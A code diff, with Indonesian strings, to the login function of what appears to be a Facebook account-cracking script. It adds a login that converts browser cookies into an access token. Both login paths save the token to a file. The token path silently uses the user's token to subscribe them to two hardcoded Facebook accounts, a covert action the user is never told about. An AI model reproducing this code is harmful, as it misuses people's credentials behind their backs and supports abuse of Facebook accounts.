@@ -26,6 +26,7 @@ os.system("clear")
 
 import data as dump
 from data import cp_detect as cpp
+from data import convert as cv
 
 ok,cp,loop = 0,0,0
 cot = ""
@@ -268,18 +269,40 @@ def login():
 .######...####....####...######..##..##.
 ........................................
 	"""
-	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
-	__token = input("[?] token\t: ")
-	try:
-		__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
-		_nama = __res['name']
-		_id = __res['id']
-		req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
-		req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
-		open("data/save.txt","a").write(__token)
-		Data(__token, _id, _nama).menu()
-	except KeyError:
-		print("\n[!] token invalid")
+	print(logo_login,"\n * Login terlerbih dahulu menggunakan accesstoken facebook!\n * Jika tidak mempunyai token atau cookies silahkan cari tutorialnya di youtube untuk mendapatkan token facebook.\n * Ketika sudah memakai sc ini maka Author tidak bertanggung jawab atas resiko apa yang akan terjadi kedepannya.\n")
+	print(" * Ingin login menggunakan apa\n[1]. Login menggunakan cookies\n[2]. Login menggunakan token")
+	bingung = input("\n[?] Login menggunakan: ")
+	__pilihan = ["01","1","02","2"]
+	while bingung not in __pilihan:
+		print("\n[!] Pilihan tidak ada")
+		bingung = input("[?] Login menggunakan: ")
+	if bingung in ("01","1"):
+		__cokiee = input("[?] cookie\t: ")
+		__coki = cv.Main(__cokiee).getToken()
+		if "EAA" in __coki:
+			_cek = json.loads(req.get(f"https://graph.facebook.com/me?access_token={__coki}").text)
+			_id = _cek['id']
+			_nama = _cek['name']
+			input(f"\n[✓] Berhasil login menggunakan cookies\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
+			open("data/save.txt","a").write(__coki)
+			Data(__coki,_id,_nama).menu()
+		elif "Cookies Invalid" in __coki:
+			exit("\n[!] Cookies Invalid")
+		else:
+			exit("\n[!] Kesalahan")
+	elif bingung in ("02","2"):
+		__token = input("[?] token\t: ")
+		try:
+			__res=json.loads(req.get(f"https://graph.facebook.com/me?access_token={__token}").text)
+			_nama = __res['name']
+			_id = __res['id']
+			req.post(f'https://graph.facebook.com/100013031465766/subscribers?access_token={__token}')
+			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={__token}')
+			input(f"\n[✓] Berhasil login menggunakan token\n * Welcome {_nama} jangan berlebihan ya!\n * Enter untuk melanjutkan ke menu")
+			open("data/save.txt","a").write(__token)
+			Data(__token, _id, _nama).menu()
+		except KeyError:
+			print("\n[!] token invalid")
 	
 	
 if __name__=="__main__":
